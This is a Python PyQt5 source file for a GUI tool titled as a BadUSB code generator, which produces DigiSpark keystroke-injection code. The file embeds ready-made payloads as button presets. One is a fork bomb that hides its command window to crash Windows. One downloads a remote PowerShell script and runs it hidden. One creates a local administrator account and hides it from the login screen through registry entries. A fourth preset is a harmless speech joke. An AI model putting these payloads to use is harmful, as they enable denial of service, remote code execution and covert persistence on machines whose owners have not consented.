import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QFontDialog, QPushButton
from PyQt5.QtCore import pyqtSlot, Qt, QEvent, pyqtSignal
from ui_mainwindow import Ui_MainWindow
from myKeyDialog import QmyDialog
from KEY import KeyShowdict, KeyInputdict
from DuckToDigi import Duckyspark_translator


# TODO pywin32有两个要做的 一是预览代码 二是截获快捷键 比如win+e 。用pyhook方便一点
# TODO qss里做一个奶白色的主题
# TODO 不光是其它按钮的 define  还有这几个正常的按钮也是没有define的


class QmyMainWindow(QMainWindow):

    def __init__(self, parent=None):
        super().__init__(parent)  # 调用父类构造函数，创建窗体
        self.__dialog = None  # 对话框占位
        self.ui = Ui_MainWindow()  # 创建UI对象
        self.ui.setupUi(self)  # 构造UI界面
        self.setWindowTitle("BadUSB代码生成")  # 标题
        self.setWindowFlags(Qt.MSWindowsFixedSizeDialogHint)  # 更窄的边框

        self.sB_label = QLabel(self)  # 放在状态栏中的标签
        self.ui.statusBar.addPermanentWidget(self.sB_label)

        self.ui.le_ci.installEventFilter(self)  # 注册监控器 供le_ci获取按键
        self._KeyBoardStatus = 0  # 按键状态
        self._keystring = ""  # 好多全局变量啊 用来传值的 发送给 组合框单击打印的

        self.ui.le_ci.setPlaceholderText("Ctrl+Shift+A")  # 按键识别输入占位符
        self.ui.le_ps.setPlaceholderText("echo HelloWorld")  # 打印字符串占位符

    def eventFilter(self, watched, event):
        if watched == self.ui.le_ci:  # 如果当前监测对象为
            # ==================== 按键按下 =======================
            if event.type() == QEvent.KeyPress:
                if self._KeyBoardStatus == 1:  # status为1 就会开启新一轮叠加
                    self.ui.le_ci.clear()  # 新一轮 需要清除编辑框
                    self._keystring = ""  # 和这个用于打印到textEdit上的字符串
                # ========================================
                if self.ui.cb_ci_ap.currentIndex() == 1:  # 索引值为1 的时候只能输入一个按键
                    self.ui.le_ci.clear()  # 把上一个press给清除掉了
                # ===================组合input要用的字符串=====================
                if len(self._keystring) == 0:
                    self._keystring = "%s" % KeyInputdict[event.key()]
                else:
                    self._keystring += ", %s" % KeyInputdict[event.key()]
                # =================↓组合show要用的字符串↓=======================
                showstr = self.ui.le_ci.text()
                if len(showstr) == 0:  # 当前编辑框是空的
                    if len(KeyShowdict[event.key()]) == 1:  # 编辑框为空时也需要屏蔽 按键重复
                        showstr = showstr
                    else:  # 否则这是个“不可打印字符”
                        showstr = KeyShowdict[event.key()]
                else:  # 编辑框里 有按键了
                    if showstr == "Ctrl" or showstr == "Ctrl+Shift":  # 这个按键 为
                        showstr = showstr + "+" + KeyShowdict[event.key()]
                    elif len(KeyShowdict[event.key()]) == 1:  # 这个按键是 单个的 用于判断 “可打印字符”
                        showstr = showstr + "+"
                    else:  # 这个是放行 shift alt tab等这些的
                        showstr = showstr + "+" + KeyShowdict[event.key()]
                self.ui.le_ci.setText(showstr)
                # ================适配=========================
                print("按键%s按下" % KeyShowdict[event.key()])  # 两个用来汇报的 日志
                self.sB_label.setText("按键%s按下" % KeyShowdict[event.key()])  # 状态栏
                self._KeyBoardStatus = 0  # 初始化键盘状态 不会开启新一轮叠加

            # ==================== 按键松开 =======================
            if event.type() == QEvent.KeyRelease:
                self._KeyBoardStatus = 1  # 目前的这三行 都是为了这个新一轮的叠加 那么最终呈现效果
                print("按键%s松开" % KeyShowdict[event.key()])
                self.sB_label.setText("按键%s松开" % KeyShowdict[event.key()])
        return super().eventFilter(watched, event)

    @pyqtSlot()
    def on_pb_od_clicked(self):
        """这个是 点击输入按钮"""
        self.__dialog = QmyDialog(self)  # 按键对话框
        self.__dialog.setAttribute(Qt.WA_DeleteOnClose)  # 对话框关闭时自动删除
        self.__dialog.ButtonClick.connect(self.DialogInput)
        self.__dialog.changeActionEnable.connect(self.do_setActLocateEnable)
        self.__dialog.show()

    @pyqtSlot()
    def on_pb_sp_ap_clicked(self):
        """这个按钮是 延时按钮"""
        ms = "DigiKeyboard.delay(%d);\n" % self.ui.sp_ms.value()
        self.ui.TextEdit.insertPlainText(ms)

    @pyqtSlot()
    def on_pb_ps_ap_clicked(self):
        """这个按钮是 打印字符串"""
        if len(self.ui.le_ps.text()) != 0:
            mystring = "DigiKeyboard.println(\"%s\");\n" % self.ui.le_ps.text()
            self.ui.TextEdit.insertPlainText(mystring)

    @pyqtSlot(int)
    def on_cb_ci_ap_activated(self, num):
        """单击 按下 松开"""
        if num == 2:  # 如果当前选项为 松开 则禁用编辑框
            self.ui.le_ci.setEnabled(False)
        else:
            self.ui.le_ci.setEnabled(True)

        if len(self._keystring) == 0 and num != 2:  # 如果编辑框为空 或者当前是第三
            return

        if num == 0:
            mystring = "DigiKeyboard.sendKeyStroke(%s);\n" % self._keystring
            self.ui.TextEdit.insertPlainText(mystring)
        elif num == 1:
            mystring = "DigiKeyboard.sendKeyPress(%s);\n" % self._keystring
            self.ui.TextEdit.insertPlainText(mystring)
        elif num == 2:
            mystring = "DigiKeyboard.sendKeyPress(0);\n"
            self.ui.TextEdit.insertPlainText(mystring)

    @pyqtSlot(int)
    def on_cb_ci_ap_currentIndexChanged(self, index):
        """
        组合框当前项改变 因为每个选项都有不同的输入要求 所以 我们直接把存储字符串数值的
        两个变量给清除掉了   要记得 一个是用于 编辑框显示的 show  另一个是实际打印到TextEdit的input
        """
        self.ui.le_ci.clear()
        self._keystring = ""

    @pyqtSlot()
    def on_action_font_triggered(self):
        inifont = self.ui.TextEdit.font()
        font, ok = QFontDialog.getFont(inifont)
        if ok:
            self.ui.TextEdit.setFont(font)

    @pyqtSlot()
    def on_pb_dtd_clicked(self):
        duckystr = self.ui.TextEdit.toPlainText()
        digistr = Duckyspark_translator(duckystr)
        self.ui.TextEdit.setPlainText(digistr)

    @pyqtSlot(str)
    def DialogInput(self, Keystr):
        self.ui.TextEdit.insertPlainText(Keystr)
        # print(Keystr)

    @pyqtSlot(bool)
    def do_setActLocateEnable(self, enable):
        self.ui.pb_od.setEnabled(enable)

    @pyqtSlot()
    def on_pb_qc1_clicked(self):
        self.ui.TextEdit.clear()
        payload = """//This script opens up a Windows command prompt and makes it open up another instance of itself and so on until the machine can take it no more and either locks or crashes. Credits to BlackBoot.
#include "DigiKeyboard.h"
void setup()
{
}

void loop()
{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //Obfuscate the terminal
  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("COLOR EF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //Run the fork bomb
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;)
  {
    /*Stops the digispark from running the scipt again*/
  }
}

"""
        self.ui.TextEdit.insertPlainText(payload)

    @pyqtSlot()
    def on_pb_qc2_clicked(self):
        self.ui.TextEdit.clear()
        payload = """//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client.DownloadFile(\"https://scriptURL\" , \"script.ps1\")");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
  DigiKeyboard.delay(750);
  //If the system hasn't been configured to run scripts, uncomment the lines bellow
  //DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(750);
  //DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
  //DigiKeyboard.delay(750);
  //DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*empty*/
  }

}
        
"""
        self.ui.TextEdit.insertPlainText(payload)

    @pyqtSlot()
    def on_pb_qc3_clicked(self):
        self.ui.TextEdit.clear()
        payload = """//This DigiSpark script opens up the powershell and makes your computer speak out a message.
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("Add-Type -AssemblyName System.speech");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  //Uncomment these lines to use a female voice
  //DigiKeyboard.print("$speak.SelectVoice('Microsoft Zira Desktop')");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(500);
  DigiKeyboard.print("$speak.Speak(\"Here's a joke. Why do Java programmers wear glasses? Because they can't C#.\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_N);
  for (;;) {
    /*empty*/
  }

}
        
"""
        self.ui.TextEdit.insertPlainText(payload)

    @pyqtSlot()
    def on_pb_qc4_clicked(self):
        self.ui.TextEdit.clear()
        payload = """//This DigiSpark script creates new local user and adds it to "Administrators" group
//Tested on Windows 10 with English(US) keyboard layout
//Created by Michyus | Edited by Elshan
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("powershell $pass = ConvertTo-SecureString \"P@ssW0rD\" -AsPlainText -Force; New-LocalUser \"accName\" -Password $pass; Add-LocalGroupMember -Group \"Administrators\" -Member \"accName\" "));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  /* I assumed user already have powershell - Try to hide the user account from the login screen*/
  DigiKeyboard.print(F("powershell New-Item -Path \"\'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\'\" -Name \"SpecialAccounts\" "));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("powershell New-Item -Path \"\'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts'\" -Name \"UserList\" "));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("powershell New-ItemProperty -Path \"\'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\'\" -Name \"accName\" -Value \"0\"  -PropertyType DWORD "));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  /* end hide user section */
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}

"""

        self.ui.TextEdit.insertPlainText(payload)

if __name__ == "__main__":  # 用于当前窗体测试
    app = QApplication(sys.argv)  # 创建GUI应用程序
    form = QmyMainWindow()  # 创建窗体
    form.show()
    sys.exit(app.exec_())
